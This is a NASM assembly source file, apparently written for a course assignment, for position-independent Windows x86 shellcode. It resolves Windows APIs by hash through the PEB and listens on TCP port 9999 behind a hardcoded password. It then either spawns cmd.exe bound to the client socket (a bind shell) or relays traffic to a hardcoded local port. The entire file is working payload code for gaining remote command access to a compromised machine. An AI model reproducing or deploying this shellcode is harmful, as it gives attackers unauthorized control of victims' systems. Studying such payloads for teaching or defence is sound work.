[BITS 32]

; Windows x86 shellcode done for an assignment
; Listens on port 9999, accepts inbound connections and authenticates with password
; After authentication, accepts command 'shell' to spawn cmd.exe (standard bind shell)

; Also accepts command 'forward' to forward client connection to a remote host
; 	- remote host currently hardcoded as 127.0.0.1:1111
;   - designed to serve as a type of primit netcat client

; assembled with nasm into shellcode.bin

mainentrypoint:

call geteip
geteip:
pop edx 
lea edx, [edx - 5]

; push base address of shellcode, reference with ebp from now on 
push edx  
mov ebp, esp
sub esp, 500h

; locate kernel32.dll
mov ebx, 0x4b1ffe8e 	; kernel32.dll hash 
call get_module_address

; restore edx with shellcode base address 
mov edx, [ebp]  		

; build kernel32.dll API function pointer table
push ebp
mov ebp, eax
lea esi, [edx + KERNEL32HASHTABLE]
lea edi, [edx + KERNEL32FUNCTIONSTABLE]
call get_api_address
pop ebp
mov edx, [ebp]  ; restore base address in edx

; call LoadLibaryA to get ws2_32.dll into memory
lea eax, [edx + WS232]
push eax
call [edx + LoadLibraryA]
mov edx, [ebp]    ; restore base address in edx

; build ws2_32.dll API function pointer table
push ebp
mov ebp, eax
lea esi, [edx + WS232HASHTABLE]
lea edi, [edx + WS232FUNCTIONSTABLE]
call get_api_address
pop ebp
mov edx, [ebp]    ; restore base address in edx

; call WSAStartup to initiate Winsock 
; WSAStartup(Word wVersionRequired, LPWSADATA lpWSAData)
sub esp, 0x190	; size of WSADATA struct
push esp 		; ptr to wsadata struct
mov ecx,0x202	; version number
push ecx
call [edx + WSAStartup]
add esp, 0x190
mov edx, [ebp]  ; restore edx

; create an IPv4, TCP socket 
; WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
push 0  ; flags 
push 0  ; group 
push 0  ; ptr to protocol info struct
push 6	; proto TCP 
push 1  ; type SOCK_STREAM
push 2 	; family AF_INET
call [edx + WSASocketA]
;mov edi, eax               ; put socket fd into edi 
mov dword [ebp - 0xc], eax ; store socket fd as local var for use later 
mov edx, [ebp]   

; Bind port 0.0.0.0:9999

; sockaddr struct { short sin_family, u_short sin_port, struct in_addr sin_addr, 8 bytes not used}

; Bind port 0.0.0.0:9999
; sin_addr struct, all zero for 0.0.0.0
push 0 	
push 0

; put sin_family and sin_port into adjacent words
push 2   					; AF_INET
mov word [esp+ 0x2], 0xf27  ; port 9999 
mov esi, esp 				; get ptr to struct in esi

; bind(socket s, sockaddr* addr, int namelen)
push 0x10         ; len of struct, aka sizeof(sockaddr_in)
push esi          ; &sockaddr struct
mov edi, dword [ebp - 0xc] ; get socket fd
push edi          ; push socket fd
call [edx + bind] ; call bind 
add esp, 0xc      ; adjust stack 
mov edx, [ebp]    ; restore edx 

; check if bind failed. if so, exit with code 1
test eax, eax  ; check for nonzero return code
mov eax, 1
jne die 

; Listen on TCP 9999

; listen(socket s, int backlog)
push 1               ; allow 1 conn in backlog
push edi             ; socket fd 
call [edx + listen]  ; call listen 
mov edx, [ebp]       ; restore edx 

; check if listen failed. if so, exit with code 2
test eax, eax  	; check for nonzero return code
mov eax, 2
jne die 

; Accept incoming connection

accept_connection:
; accept(socket s, sockaddr *addr, int *addrlen)
push 0               ; addrlen (optional)
push 0 	             ; *addr (optional)
mov edi, dword [ebp - 0xc] ; get socket fd
push edi             ; push socket fd
call [edx + accept]  ; call accept 
mov edx, [ebp]       ; restore edx 

; store new socket fd as local variable at the bottom of the stack frame
mov dword [ebp - 4], eax 

; After a connection, authenticate client with password 

; Read 8 bytes from socket and drop onto stack 

; recv(socket s, char *buf, int len, int flags)
mov ebx, esp          ; store addr of buf in ebx 
push 0  	          ; flags, NULL 
push 9 	 	          ; len of string to read; 8 byte password with newline 
push ebx 	          ; push addr of buf  
push dword [ebp - 4]  ; client socket 
call [edx + recv]     ; call recv 
mov edx, [ebp]        ; restore edx 

; Check if password is correct
auth:

; Pop password off stack in two parts
; If it doesn't match "password", jump to drop_client
pop ebx
pop ecx
cmp ebx, 0x73736170   ;"pass"
jne drop_client       
cmp ecx, 0x64726f77   ;"word"
jne drop_client       

; Auth succeeded, send welcome message and continue to recv command 

; send(socket s, char *buf, int len, int flags)
push 0                        ; flags
push dword welcome_len        ; len of welcome message
lea eax, [edx + welcome_msg]  ; load addr of welcome message
push eax                      ; push addr of welcome message
push dword [ebp - 4]          ; client socket to write to
call [edx + send]             ; call send 
mov edx, [ebp]                ; restore edx 
 
; Parse command - 'shell' or 'forward' - and execute
read_command:

; Read 15 bytes containing command
; recv(socket s, char *buf, int len, int flags)
mov esi, [ebp - 4] ; load client socket fd into esi 
mov ebx, esp       ; addr to write command
push 0  	       ; flags, NULL 
push 0xf 	       ; len of string to read 
push ebx 	       ; addr of buf 
push esi 	       ; client socket 
call [edx + recv]  ; call recv
mov edx, [ebp]     ; restore edx

; do string compare with cmpsb.  If command is 'shell', jump to do_shell
lea esi, [edx + command_shell]  ; addr of string 'shell'
mov edi, esp  					; addr of string from client
mov ecx, 5   				    ; length to compare 
rep cmpsb                       ; compare strings in esi and edi 
je do_shell  	   	            ; if string matches, execute cmd.exe 

; if no match, check for command 'forward'.  If match, jump to do_forward_conn 
lea esi, [edx + command_forward_conn] ; addr of string 'forward_conn'
mov edi, esp   					      ; addr of string from client                   
mov ecx, 7  				          ; length to compare 
rep cmpsb                             ; compare strings in esi and edi 
je do_forward_conn 					  ; if string matches, forward connection to remote host 

; if no match, drop client and go back to accept 
jmp drop_client

; Connect to remote host on hardcoded TCP port, then facilitate half-duplex communication between 
; the connected client and the remote host 
do_forward_conn:

; Create new socket to connect to remote host 
; WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
push 0                   ; dwFlags 
push 0                   ; group 
push 0                   ; protocol info
push 6	                 ; proto TCP 
push 1                   ; type SOCK_STREAM
push 2                   ; family AF_INET
call [edx + WSASocketA]  ; call WSASocketA

; store new socket as local var next to the first one
mov dword [ebp - 8], eax
mov edx, [ebp]

; Connect to 127.0.0.1:1111 
; connect(socket s, sockaddr *name, int namelen (optional, not used))

; sockaddr struct { short sin_family, u_short sin_port, struct in_addr sin_addr, 8 bytes not used}
; sin_addr struct = { 7f00 0001 }
push 0x0100007f

; put sin_family and sin_port into adjacent words
push 2   					  ; AF_INET
mov word [esp + 0x2], 0x5704  ; port 1111 
mov eax, esp 				  ; get ptr to struct in eax
push byte 0x10 		          ; len of struct, aka sizeof(sockaddr_in)
push eax                      ; addr of struct 
push dword [ebp - 8]          ; new socket connected to remote host
call [edx + connect]          ; call connect 
add esp, 0xc    	          ; adjust stack 
mov edx, [ebp]                ; restore edx 

; if eax non zero, call WSAGetLastError
test eax, eax 
jz forward_conn_loop 

; get error code and die 
call [edx + WSAGetLastError]
mov edx, [ebp]
jmp die

; Continually poll each socket to check for received data
; If data has been received, recv it and then send through the other socket
forward_conn_loop:

; load socket fds into registers
mov esi, dword [ebp - 4] ; connected client socket 
mov edi, dword [ebp - 8] ; remote host socket 

; Call select on listen socket, and if readable, recv and write to connect socket 
push esi
call poll_socket_input
test eax, eax 
jz forward_conn_loop_section_2  ; if no data has been received, check the other end 
push edi
push esi
call relay_data   ; read data from listen socket and write to connect socket 

forward_conn_loop_section_2:
; Call select on connect socket, and if readable, recv and write to listen socket 
push edi 
call poll_socket_input
test eax, eax 
jz forward_conn_loop   ; if no data has been received, start loop over again 
push esi
push edi
call relay_data  ; read data from connect socket and write to listen socket 

jmp forward_conn_loop

; when one side closes the connection, error triggered in relay_data will cause exit with error code -1


; do_shell - spawn cmd.exe and exit gracefully with code 0 
do_shell:
; create STARTUPINFO struct 
; typedef struct _STARTUPINFOA {
;	0x44 	DWORD cb 				
;	NULL 	LPSTR lpReserved
;	NULL 	LPSTR lpDesktop
;	NULL 	LPSTR lpTitle
;	NULL 	DWORD dwX
;	NULL 	DWORD dwY 
;	NULL 	DWORD dwXSize
;	NULL 	DWORD dwYSize
;	NULL 	DWORD dwXCountChars 
;	NULL 	DWORD dwYCountChars
;	NULL 	DWORD dwFillAttribute
;	STARTF_USESTDHANDLES 	DWORD dwFlags 
;	NULL 	WORD wShowWindow
;	NULL 	WORD cbReserved2 
;	NULL 	LPBYTE lpReserved2
;	esi 	HANDLE hStdInput
;	esi 	HANDLE hStdOutput
;	esi 	HANDLE hStdError
;}
; total size 4*12 + 2*2 + 4*4 = 68 = 0x44
mov esi, [ebp - 4] ; put client socket into esi 
push esi           ; STDERR - handle to client socket 
push esi           ; STDOUT - handle to client socket 
push esi           ; STDIN  - handle to client socket 
push 0             ; lpReserved2
push 0             ; both WORDs
push 0x100         ; dwFlags - set STARTF_USESTDHANDLES
push 0             ; dwFillAttribute
push 0             ; dwYCountChars
push 0             ; dwXCountChars
push 0             ; dwYSize
push 0             ; dwXSize
push 0             ; dwY
push 0             ; dwX
push 0             ; lpTitle
push 0             ; lpDesktop
push 0             ; lpReserved
push 0x44          ; cb, length of struct 
mov ebx, esp       ; store pointer to struct in ebx

; make space for PROCESS_INFORMATION struct, doesnt need to be filled
sub esp, 0x10

; Call CreateProcessA 

; CreateProcessA(NULL, &"cmd.exe", NULL, NULL, bInheritHandles = TRUE, NULL, NULL, NULL, 
; &STARTUPINFO struct, &PROCESS_INFORMATION struct)

push esp                    ; ptr to PROCESS_INFORMATION struct that receives info about new proc 
push ebx                    ; ptr to STARTUPINFO struct with handles in it 
push 0                      ; lpCurrentDirectory
push 0                      ; lpEnvironment 
push 0                      ; dwCreationgFlags - maybe change this to detached proc or no console window?
push 1                      ; bInheritHandles = TRUE 
push 0                      ; lpThreadAttributes 
push 0                      ; lpProcessAttributes
lea eax, [edx + cmd]        ; load and push address of "cmd.exe" string
push eax
push 0                      ; modulename
call [edx + CreateProcessA] ; call CreateProcessA
add esp, 0x54               ; restore stack location
mov edx, [ebp]              ; restore edx for call to ExitProcess

; check if CreateProcess failed 
; return code is zero on failure, for some reason. if it failed, exit with error code 4
test eax, eax 
mov eax, 4
je die 

; Otherwise cmd was successfully spawned, so exit with return code zero 
mov eax, 0 

; Exit with ExitProcess
die:

push eax  
call [edx + ExitProcess]


; drop_client - print "Denied" message, shutdown and close socket, then go back to accepting connections 
drop_client:

push 0                        ; flags 
push dword denied_len         ; len of string to write
lea eax, [edx + denied_msg]   ; get addr of denied message
push eax                      ; push addr of string 
push dword [ebp - 4]          ; push client socket fd
call [edx + send]             ; call send 
mov edx, [ebp]                ; restore edx 

; shutdown socket 
; shutdown (socket s, int how)
push 2                 ; SD_BOTH, disable send and receive ops 
push dword [ebp - 4]   ; client socket 
call [edx + shutdown]  ; call shutdown 
mov edx, [ebp]         ; restore edx 

; close socket 
; closesocket(socket s)
push dword [ebp - 4]     ; client socket 
call [edx + closesocket] ; call close_socket 
mov edx, [ebp]           ; restore edx 

; go back to accepting connections 
jmp accept_connection


; poll_socket_input - Use select() to check if there's any data to be read from a socket
; poll_socket_input(socket s)
poll_socket_input:

; treat this as a real function with its own stack frame
push ebp      
push edx      ; keep edx at the base of this stack frame too 
mov ebp, esp 

; set up FD_SET struct and timeval struct for select()

; typedef struct fd_set { u_int fd_count, SOCKET fd_array[FD_SETSIZE] }
push dword [ebp + 0xc]  ; socket arg
push 1                  ; set contains one socket fd 
mov eax, esp            ; store addr of FD_SET struct in eax 

; typedef struct timeval { long tv_sec, long tv_usec }
; causes select to time out right away if socket is not immediately readable  
push 0
push 0
push 1
push 0
mov ebx, esp  ; store addr of timeval struct in ebx 

; Call select to check if socket is readable 
; select( int nfds, fdset *readfs, fdset *writefds, fdset *exceptfds, timeval *timeout)
push ebx     ; addr of timeval struct 
push 0       ; *exceptfds 
push 0       ; *write sockets 
push eax     ; ptr to listen socket 
push 0 	     ; nfds, not used 
call [edx + select]
add esp, 24  ; adjust stack back to where it was

; restore edx and ebp then return to calling function
pop edx 
pop ebp 
ret 4

; relay_data - Read data from socket1 and write to socket2. Max data size is 0x50
; relay_data(socket1, socket2)
relay_data:

; treate this as a real function with its own stack frame 
push ebp 
push edx
mov ebp, esp 
sub esp, 0x100

mov esi, [ebp + 0xc]  ; socket 1, passed as arg1
mov edi, [ebp + 0x10] ; socket 2, passed as arg2

; read from socket1

; Call recv(socket s, char *buf, int len, int flags)
mov [ebp - 4], esp      ; addr of buffer to write 
push 0  	            ; flags, NULL 
push 0x50 	 	        ; len of string to read 
push dword [ebp - 4]    ; addr of buf     
push esi 				; socket to read from
call [edx + recv]       ; call recv
mov edx, [ebp]          ; restore edx

; if eax is 0xffffffff, connection probably closed, so exit 
cmp eax, 0xffffffff 
je die 

; write to connect socket 
; send(socket s, char *buf, int len, int flags)
push 0  			 ; flags 
push eax 			 ; len of string to write
lea eax, [ebp - 4]   ; get addr of buffer
push dword [eax]  	 ; push addr of string 
push edi 			 ; socket to write to
call [edx + send]    ; call send 
mov edx, [ebp] 		 ; restore edx 

; exit 
add esp, 0x100
pop edx 
pop ebp 
ret





; returns module base in EAX
; EBP = Hash of desired module
get_module_address:

;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]

next_module_loop:
mov esi, [edi+0x28]
xor edx, edx

module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20

end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop

end_module_hash_loop:
cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop
ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]
; Removed the next instruction, which caused the second API function not to resolve properly
; xor ecx, ecx

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret


KERNEL32HASHTABLE:
	dd 0x46318ac7 ; CreateProcessA
	dd 0x95902b19 ; ExitProcess
	dd 0xc8ac8026 ; LoadLibraryA
	dd 0xFFFF

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000001
ExitProcess:
	dd 0x00000002
LoadLibraryA:
	dd 0x00000003

WS232HASHTABLE:
	dd 0x8e878072 ; WSAGetLastError
	dd 0xeefa3514 ; WSASocketA
	dd 0xcdde757d ; WSAStartup
	dd 0x3c797b7a ; accept
	dd 0x0c5a7764 ; bind
	dd 0x939d7d9c ; closesocket 
	dd 0xedd8fe8a ; connect
	dd 0x9e7d3188 ; listen
	dd 0xe5971f6  ; recv
	dd 0x5d99726a ; select
	dd 0xe797764  ; send
	dd 0x4c7c5841 ; shutdown 
	dd 0xFFFF

WS232FUNCTIONSTABLE:
WSAGetLastError:
	dd 0x00000004
WSASocketA:
	dd 0x00000005
WSAStartup:
	dd 0x00000006
accept:
	dd 0x00000007
bind:
	dd 0x00000008
closesocket:
	dd 0x00000009
connect: 
	dd 0x0000000a
listen:
	dd 0x0000000b
recv:
	dd 0x0000000c
select: 
	dd 0x0000000d
send:
	dd 0x0000000e
shutdown: 
	dd 0x0000000f

WS232:
	db "ws2_32.dll",0x00

cmd:
	db "cmd.exe",0x00

denied_msg:
	db "Denied, goodbye",0x0a,0x00
	denied_len equ $-denied_msg

welcome_msg:
	db 0x0a,"Accepted, welcome!",0x0a,"Enter command 'shell' or 'forward': ",0x00
	welcome_len equ $-welcome_msg

command_shell:
	db "shell",0x00 

command_forward_conn:
	db "forward",0x00
